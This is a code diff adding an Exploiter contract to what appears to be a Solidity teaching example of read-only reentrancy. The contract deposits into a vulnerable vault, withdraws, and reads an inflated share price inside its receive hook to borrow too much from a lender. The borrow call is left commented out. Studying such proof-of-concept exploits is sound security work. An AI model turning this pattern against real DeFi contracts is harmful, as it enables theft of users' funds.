@@ -45,7 +45,7 @@ contract Lender {
         //a lot of checks have not been wrote as this is just an example for read only reentrancy
         uint256 maxBorrow = collateralShares * price * 80 / 100; //80% LTV 
         
-        // usdc.transfer(msg.sender, maxBorrow);
+        // usdc.transfer(msg.sender, maxBorrow);  - commented because i have not implemented usdc
     }
 }
 
@@ -55,3 +55,30 @@ interface IVulnerableVault {
     function getSharePrice() external view returns (uint256);
 }
 
+contract Exploiter {
+    IVulnerableVault vault;
+    Lender lender;
+    bool flag = false;
+    constructor(address _vault, address _lender) {
+        vault = IVulnerableVault(_vault);
+        lender = Lender(_lender);
+    }
+
+    function attack() external payable {
+        //deposit to get shares
+        vault.deposit{value: 10 ether}();
+        //withdraw to trigger our receive
+        vault.withdraw(10 ether);
+    }
+
+    receive() external payable {
+        if (flag == false) {
+            flag = true;
+            
+            uint256 price = vault.getSharePrice();
+            //the price is huge so we can lend more than we shouldve
+            
+            //lender.borrow(10000 usdc); - commented because i have not implemented usdc
+        }
+    }
+}
